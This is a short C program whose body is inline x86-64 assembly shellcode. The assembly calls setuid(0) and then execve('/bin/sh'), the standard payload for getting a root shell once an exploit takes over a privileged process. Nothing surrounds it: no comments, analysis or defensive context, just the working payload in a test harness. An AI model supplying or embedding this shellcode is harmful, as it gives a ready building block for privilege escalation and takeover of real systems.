int main()
{
    __asm__("xorq %rdi,%rdi\nmov $0x69,%al\nsyscall\nxorq %rdx,%rdx\nmovq $0x68732f6e69622fff,%rbx\nshr $0x8,%rbx\npush %rbx\nmovq %rsp,%rdi\nxorq %rax,%rax\npush %rax\npush %rdi\nmovq %rsp,%rsi\nmov $0x3b,%al\nsyscall");
}
